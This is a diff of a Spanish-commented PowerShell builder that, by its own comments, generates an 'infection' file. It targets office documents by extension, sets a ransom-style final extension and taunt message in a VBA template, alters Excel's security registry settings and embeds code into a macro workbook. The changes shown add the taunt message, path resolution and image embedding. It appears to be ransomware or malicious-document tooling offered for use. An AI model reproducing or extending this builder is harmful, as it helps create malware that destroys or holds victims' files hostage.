@@ -1,4 +1,4 @@
-﻿# Este codigo permite generar el LNK de infección
+# Este codigo permite generar el LNK de infección
 # Los parámetros de configuracion están en el archivo VBA asociado
 
  param (
@@ -12,6 +12,7 @@ $ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".em
 $final_ext = ".palquelee"
 $file_output = (Split-Path $file_input -Leaf).Replace("xlsx","xlsm") # Nombre del archivo final
 $file_image = "bg.jpg" # Nombre de la imagen a embeber
+$mensaje_final = "Ya valiste wey!"
 #####
 #####
 
@@ -38,6 +39,8 @@ $ext = "\.(" + ($ext -join "|" -replace "\.","") + ")$"
 $cont = $cont.Replace("{{DIRECTORIOS}}", $dirs)
 $cont = $cont.Replace("{{LISTADO_EXTENSIONES}}",$ext)
 $cont = $cont.Replace("{{EXTENSION_FINAL}}", $final_ext)
+$cont = $cont.Replace("{{MENSAJE_FINAL}}", $mensaje_final)
+
 
 # Abrimos una instancia de la aplicación Excel.
 $excel = New-Object -ComObject Excel.Application;
@@ -50,11 +53,12 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Secu
 
 #open file
 if((Test-Path $file_input) -eq $false){Write-Host "ERROR: No esta el archivo: "$file_input; return}
+$file_input = Resolve-Path $file_input
 $workbook = $excel.Workbooks.Open($file_input)
 
 # Agregando la foto de fondo de pantalla (puede ir donde sea, mientras sea 1 foto agregada en "Shapes"
 $sheet = $workbook.worksheets.Item(1);
-$sheet.Shapes.AddPicture(($file_input), 0, -1,30000,30000,-1,-1) | Out-Null
+$sheet.Shapes.AddPicture((Resolve-Path $payloads$file_image), 0, -1,30000,30000,-1,-1) | Out-Null
 
 # Agregando el código VBA que tengo en un archivo aparte.
 #$test = $workbook.VBProject.VBComponents.Item(1).CodeModule.AddFromFile($payloads + $archivo);
